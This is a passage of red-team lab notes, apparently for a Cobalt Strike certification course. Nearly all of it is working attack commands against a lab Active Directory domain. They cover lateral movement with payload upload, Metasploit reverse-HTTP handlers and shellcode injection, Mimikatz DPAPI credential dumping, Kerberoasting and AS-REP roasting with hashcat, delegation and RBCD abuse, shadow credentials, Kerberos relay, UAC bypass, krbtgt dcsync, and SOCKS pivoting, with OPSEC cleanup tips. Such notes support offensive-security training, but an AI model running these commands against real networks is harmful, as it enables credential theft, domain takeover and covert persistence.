beacon> link web.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# 4. Execute a .NET binary remotely (example: Seatbelt for OS info).
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# 5. Another approach: Remote-Exec with SharpWMI.
# Use SharpWMI to run commands on the remote system.
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"
```

### Invoke-DCOM
```r
# Invoke DCOM (OPSEC)

# 1. Import the Invoke-DCOM script in the current session.
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1

# 2. Change to the ADMIN$ share on the target system.
beacon> cd \\web.dev.cyberbotic.io\ADMIN$

# 3. Upload the payload to the target system.
beacon> upload C:\Payloads\smb_x64.exe

# 4. Execute the payload on the target system using DCOM.
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe

# 5. Establish a link to the compromised system.
beacon> link web.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# NOTE: When using remote-exec for lateral movement, a Windows service binary is generated,
# because psexec creates a service pointing to the uploaded binary to run it.
```

---

# Session Passing

## Beacon Passing
```r
# Create an alternate HTTP Beacon in Cobalt Strike with DNS as a lifeline

# 1. Spawn a new alternate HTTP Beacon from an existing session.
# This creates a fallback connection for persistence if the main one fails.
beacon> spawn x64 http

# 2. Configure the new HTTP Beacon in Cobalt Strike.
# Make sure the HTTP profile is properly set to talk to the server.

# 3. Maintain DNS as a lifeline.
# Configure a DNS listener as a secondary channel if the HTTP channel is lost.
```

## Metasploit

### Foreign Listener (x86)
```r
# From Cobalt Strike to Metasploit - Staged Payload (only x86 payloads)

# 1. Set up a Metasploit listener.
attacker@ubuntu ~> sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

# 2. Configure the Foreign Listener in Cobalt Strike.
#    - HTTP Host (Stager): 10.10.5.50
#    - HTTP Port (Stager): 8080

# 3. Use Jump psexec in Cobalt Strike to execute the Beacon payload and pass the session.
beacon> jump psexec Foreign_listener
```

### Shellcode Injection
```r
# From Cobalt Strike to Metasploit - Stageless Payload

# 1. Configure a Metasploit listener.
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) > set LHOST 10.10.5.50
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit

# 2. Generate a stageless binary with msfvenom.
ubuntu@DESKTOP-3BSK7NO > msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# 3. Inject Metasploit shellcode into a remote process from Cobalt Strike.
beacon> shinject /mnt/c/Payloads/msf_http_x64.bin
```

### Compatibility Options
```r
# Meterpreter Payload Configuration

# 1. Select the Payload.
# e.g., `windows/meterpreter/reverse_http` or `windows/meterpreter/reverse_https`.
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_https

# 2. Set LHOST and LPORT pointing to the beacon.
msf> set LHOST <BEACON_IP>
msf> set LPORT <BEACON_PORT>

# 3. Optional extra config:
# Disable the Payload Handler
msf> set DisablePayloadHandler True
# Enable PrependMigrate for better persistence
msf> set PrependMigrate True

# 4. Launch the exploit in Job mode (-j).
msf> exploit -j
```

---

# Data Protection API
```r
# Using Mimikatz to dump secrets from Windows Vault

# 1. Dump all secrets stored in the Windows Vault.
beacon> mimikatz !vault::list
beacon> mimikatz !vault::cred /patch

# 2. Enumerate stored credentials.
# Check if the system has credentials stored in the web or windows vault.
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all

# 3. Use Seatbelt for more detailed info on Windows Vault.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

## Credential Manager
```r
# Extracting stored RDP passwords

# 1. Locate the encrypted credential blob in the credential directory.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

# 2. Confirm the credential blob in the user's local Microsoft\Credentials folder (take note of the blob ID).
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

# 3. The master key is stored in the user’s Protect directory.
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

# 4. Decrypt the Master Key (must be in the context of the user that owns the key, use the @ symbol for impersonation).
# Execute as SYSTEM - WKSTN-2.
beacon> mimikatz !sekurlsa::dpapi

# Execute as BFARMER - WKSTN-2.
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

# 5. Use the Master Key to decrypt the credential blob.
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

## Scheduled Task Credentials
```r
# Scheduled Tasks Credentials

# 1. The Task Scheduler credentials are stored in an encrypted blob at:
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

# 2. Identify the Master Key GUID for the encrypted blob (e.g., F3190EBE0498B77B4A85ECBABCA19B6E).
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

# 3. Dump all Master Keys and find the one matching the GUID from above.
beacon> mimikatz !sekurlsa::dpapi

# 4. Use the blob and Master Key to decrypt and extract the cleartext password.
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
```

---

# Kerberos

## Kerberoasting
```r
# Kerberoasting

# 1. Search Active Directory for all user objects with a defined _servicePrincipalName_ attribute.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# 2. Run Rubeus in kerberoast mode for the target user (example: mssql_svc).
# This requests a TGS (Ticket Granting Service) for that account.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
# Example output:
$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$E<SNIPPED>0B696

# 3. Run hashcat to crack the TGS.
ps> hashcat -a 0 -m 13100 hashes wordlist
```

## ASREP-Roasting
```r
# ASREP Roasting

# 1. Query Active Directory for users with the "Don't require Kerberos preauthentication" flag (value 4194304).
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# 2. Request the ASREP for the target account (e.g., squid_svc).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
# Example output:
$krb5asrep$squid_svc@dev.cyberbotic.io:FA<SNIPPED>495

# 3. Use hashcat to crack the ASREP hash.
ps> hashcat -a 0 -m 18200 squid_svc.hash wordlist
```

## Uncontrained Delegation
```r
# Unconstrained Delegation
# Caches the TGT of any user accessing its service.

# 1. Identify computer objects with Unconstrained Delegation enabled.
# Note: Domain Controllers always have unconstrained delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Example lab:
# [+] samaccountname : DC-2$
# [+] dnshostname    : dc-2.dev.cyberbotic.io
# [+] samaccountname : WEB$
# [+] dnshostname    : web.dev.cyberbotic.io

# 2. Dump the cached TGT in the affected system (requires system access).
beacon> getuid

# List Kerberos tickets in the memory of the current or all logon sessions (requires privileged session).
# We want Domain Admin's TGT (nlamb @ DEV.CYBERBOTIC.IO krbtgt/DEV.CYBERBOTIC.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# 3. Dump the cached TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap

# 4. Inject the TGT and access the service.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

beacon> steal_token 1540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# Rubeus Monitor method

# 1. Obtain nlamb's ticket using the Monitor method.
# (The monitor command periodically checks for tickets on the system).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

# 2. Inject the ticket and access the service.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFuj[...]lDLklP

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# S4U method

# 1. Execute PrintSpool trick to force the DC to authenticate to WEB (TARGET / LISTENER).
# (From WKSTN-2 as BFARMER in the lab).
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

# 2. Use the Machine TGT to get RCE on itself using S4U abuse (/self).
# (Use DC-2$ TICKET in the lab).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# 3. Inject the ticket and access the service.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

## Constrained Delegation
```r
# Constrained Delegation
# Allows requesting TGS for any user using their TGT.

# 1. Identify machine objects with Constrained Delegation enabled.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto

# 2. Perform the attack from an account that has Constrained Delegation enabled.
# In lab, from MSSQL_SVC using a user impersonation technique.
beacon> make_token DEV\mssql_svc Cyberb0tic
beacon> jump psexec64 sql-2.dev.cyberbotic.io smb
```

```r
# S4U method
# Dump the KRBTGT from the machine’s or user’s TGT with Constrained Delegation.
# (Use asktgt if you have the user’s NTLM hash).

# 1. Show the user’s context for Beacon.
beacon> getuid

# 2. List all Kerberos tickets in memory with Rubeus triage.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# 3. Dump the KRBTGT from the lab (sql-2$ @ DEV.CYBERBOTIC.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 4. Use S4U to request a TGS for the delegated service using the machine’s TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

# 5. Inject the S4U2Proxy ticket into a new logon session.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

# 6. Access the service using the impersonated ticket.
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# S4U method (Alternate Service Name).
# Dump the KRBTGT from a machine with Constrained Delegation enabled.

# 1. Show user context.
beacon> getuid

# 2. List Kerberos tickets with Rubeus triage.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# 3. Dump the KRBTGT from the lab (sql-2$ @ DEV.CYBERbotic.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 4. Access another alternate service not listed in Delegation (e.g., LDAP).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

# 5. Inject the S4U2Proxy ticket.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

# 6. Access the service using the in-memory ticket.
beacon> steal_token 2628
beacon> ls \\dc-2.dev.cyberbotic.io\c$
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

## S4U2Self
```r
# 1. Request and inject the TGS S4U2Proxy with Rubeus.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc-2$ /ticket:doIF<CODE SNIPPED>DLklP /impersonateuser:nlamb /altservice:cifs/dc-2.dev.cyberbotic.io /self /ptt

# 2. Verify the injected ticket.
beacon> run klist
Server: cifs/dc-2.dev.cyberbotic.io @ DEV.CYBERBOTIC.IO

# 3. Access resources using the injected ticket.
beacon> ls \\dc-2.dev.cyberbotic.io\c$
[*] Listing: \\dc-2.dev.cyberbotic.io\c$\

# 4. Clean up tickets from memory.
beacon> run klist purge
```

## Resource-Based Constrained Delegation (RBCD)
```r
# Resource-Based Constrained Delegation (systems with msDS-AllowedToActOnBehalfOfOtherIdentity writable)

# 1. Identify computer objects that have msDS-AllowedToActOnBehalfOfOtherIdentity set.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samaccountname,dnshostname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

# 2. Identify domain computers where we can write this attribute with a custom value.
beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# 3. Convert a SID to a readable account name for more clarity.
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

```r
# Method 1: Existing computer (Example: WKSTN-2)
# RBCD attack with an existing computer.

# 1. Assign delegation rights to the computer by modifying the target system’s attribute.
beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)";
beacon> powerpick $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0);
beacon> powerpick Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

# 2. Verify the updated delegation attribute.
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 3. Get the TGT of our computer (WKSTN-2 as BFARMER*).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 4. Use the S4U technique to get the TGS for the target system using the TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

# 5. Access the target system’s services.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 6. Remove the delegation rights for OPSEC cleanup.
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

```r
# Method 2: Create a fake computer (Example: EvilComputer)
# Create a fake computer account to carry out RBCD.

# 1. Check if we have permissions to create a computer account (allowed by default).
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

# 2. Create a fake computer with a random password and produce its hash.
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

# 3. Use the generated hash to get a TGT for the fake computer.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

# 4. Assign delegation rights to the fake computer by modifying the target system’s attribute.
beacon> powerpick Get-DomainComputer -Identity EvilComputer -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-XXXXX)";
beacon> powerpick $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0);
beacon> powerpick Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

# 5. Verify the updated delegation attribute.
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 6. Use the S4U technique to get the TGS for the target system using the TGT of the fake computer.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIF8jCCBe<CODE SNIPPED>aWMuaW8= /nowrap

# 7. Access the target system’s services.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 8. Remove the delegation rights for cleanup.
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

## Shadow Credentials
```r
# Shadow Credentials (systems with msDS-KeyCredentialLink writable)

# 1. List any existing keys on the target (useful for later cleanup).
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$

# 2. Add a new set of keys to the target.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$

# 3.1. Request a TGT using the Rubeus command provided by Whisker.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuAI<CODE SNIPPED>2RwICB9A= /password:"Bj4qg5Q3gvPTGrLZ" /nowrap

# 3.2. Request a TGT with AES256 encryption for better OPSEC.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuAI<CODE SNIPPED>2RwICB9A= /password:"Bj4qg5Q3gvPTGrLZ" /enctype:aes256 /nowrap

# 4. Use the S4U technique to request a malicious WMI event for the final TGS.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# 5. Inject the S4U2Proxy ticket into a new logon session.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 6. (OPSEC) Clean up the newly created credentials.
# 6.1. List all credentials present.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$

# 6.2. Clear all credentials.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe clear /target:dc-2$

# 6.3. Remove specific credentials manually.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:6fc40b8d-dcb1-425d-b2d6-795be4211d18
```

## Kerberos Relay Attacks

## Malleable profile
```r
# 1. Stop the `teamserver.service`
sudo systemctl stop teamserver.service
sudo systemctl status teamserver.service

# 2. Make a backup of `webbug.profile`
cd cobaltstrike/c2-profiles/normal/webbug.profile
cp webbug.profile crto.profile

# 3. Edit the `crto.profile`
nano crto.profile

# 4. Add the following line at the top:
# set tasks_max_size "2097152";

# 5. Edit the service to point to the new profile
cd /etc/systemd/system/
sudo nano teamserver.service

# 6. Modify the service to point to the new profile
# ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/crto.profile

# 7. Restart the service
sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl status teamserver.service
```

Also remember to restart the team server and regenerate your payloads after making changes to the Malleable C2 profile.

## Import BOF (SCMUACBypass)
```r
PS> cd C:\Tools\SCMUACBypass

CobaltStrike > Script Manager > Load
"C:\Tools\SCMUACBypass\scmuacbypass.cna"
```
```r
# Example usage
beacon> elevate
svc-exe-krb        Get SYSTEM via an executable run as a service via Kerberos authentication
```

## Kerberos Relay RBCD
```r
# Create a fake computer account for the Kerberos Relay RBCD attack.

# 1. Import PowerView.ps1
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# 2. Check if we can create a computer account (allowed by default).
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

# 3. Create a fake computer with a random password (generate the hash with Rubeus).
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

# 4. Get the SID of the fake computer
beacon> powerpick Get-DomainComputer -Identity EvilComputer -Properties objectSid

# 5. Find a suitable port for the OXID Resolver
# (Avoid checking on RPCSS)
beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe

# 6. Run KrbRelay
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10

# - `-spn`: the targeted service for the relay
# - `-clsid`: `RPC_C_IMP_LEVEL_IMPERSONATE`
# - `-rbcd`: the SID of the fake computer
# - `-port`: the port returned by CheckPort

# 7. Check WKSTN-2$ for any entries in msDS-AllowedToActOnBehalfOfOtherIdentity
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 8. Get the AES256 of EvilComputer
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

# 9. Request a TGT for EvilComputer with asktgt (using AES256)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap

# 10. Use S4U to request a TGS for host/wkstn-2
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /user:EvilComputer$ /msdsspn:host/wkstn-2.dev.cyberbotic.io /ticket:doIF8j[...snip...]MuaW8= /ptt

# 11. Elevate privileges with the ticket to interact with the Service Control Manager
beacon> elevate svc-exe-krb tcp-local
```

## Kerberos Relay Shadow Credentials
The advantage of using shadow credentials over RBCD is that you don’t need to add a fake computer to the domain.
```r
# Kerberos Relay Shadow Credentials

# 1. Check WKSTN-2 does not have anything in its `msDS-KeyCredentialLink`
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$

# 2. Run KrbRelay with the -shadowcred parameter
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10

# - `-spn`: targeted service
# - `-clsid`: RPC_C_IMP_LEVEL_IMPERSONATE
# - `-shadowcred`: indicates usage of Shadow Credentials
# - `-port`: from CheckPort

# 3.1. Request a TGT for WKSTN-2 in RC4 (command generated by KrbRelay)
Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA<SNIPPED>ECAgfQ /password:"7faf0673-f9b2-4aef-8bd4-c3c4df53ea12" /getcredentials /show

# 3.2. Alternatively, request a TGT with AES256
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"7faf0673-f9b2-4aef-8bd4-c3c4df53ea12" /enctype:aes256 /nowrap

# 4. Use S4U to request a TGS for the host service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt

# 5. Elevate privileges with the ticket
beacon> elevate svc-exe-krb tcp-local
```

---

# Pivoting
```r
|------------------------|-----------------|
| Host                   | IP Address      |
|------------------------|-----------------|
| Attacker Desktop       | 10.10.5.40      |
| Attacker Desktop (WSL) | 10.10.5.40      |
| Attacker Linux (Ubuntu)| 10.10.5.50      |
| Workstation 2          | 10.10.123.102   |
| Workstation 1          | 10.10.123.101   |
| Web Server             | 10.10.122.30    |
| Studio DC              | 10.10.150.10    |
| Squid Proxy            | 10.10.122.254   |
| SQL Server 2           | 10.10.122.25    |
| SQL Server 1           | 10.10.120.25    |
| SCM Server 1           | 10.10.120.30    |
| Power DNS              | 10.10.5.250     |
| MSP DC                 | 10.10.151.10    |
| File Share             | 10.10.122.15    |
| Exchange Server        | 10.10.120.20    |
| Elastic Stack          | 10.10.120.100   |
| Domain Controller 2    | 10.10.122.10    |
| Domain Controller 1    | 10.10.120.10    |
|------------------------|-----------------|
```

## SOCKS + Proxychains
```r
# 1. Enable Socks Proxy in the Beacon session (Use SOCKS5 for better OPSEC).
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Check the SOCKS proxy in the team server
attacker@ubuntu > sudo ss -lpnt

# 3. Configure Proxychains on Linux
attacker@ubuntu > sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080 3ky 3kyRoad2CRTO

# 4. Configure Proxychains on WSL
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
socks5 10.10.5.50 1080 3ky 3kyRoad2CRTO

# 4. Example with Attacker Linux (Ubuntu)
attacker@ubuntu > proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10

# 5. Example with Attacker Desktop (WSL)
ubuntu@DESKTOP-3BSK7NO > proxychains wmiexec.py DEV/jking@10.10.122.30
Qwerty123
```

## SOCKS + Kerberos
```r
# 1. Request a TGT for `jking` using his AES256 key 
# mimikatz !sekurlsa::ekeys
ubuntu@DESKTOP-3BSK7NO > proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking

# 2. Create an environment variable `KRB5CCNAME` pointing to the generated ccache
ubuntu@DESKTOP-3BSK7NO > export KRB5CCNAME=jking.ccache

# 3. Run impacket-psexec to get a SYSTEM shell on WEB
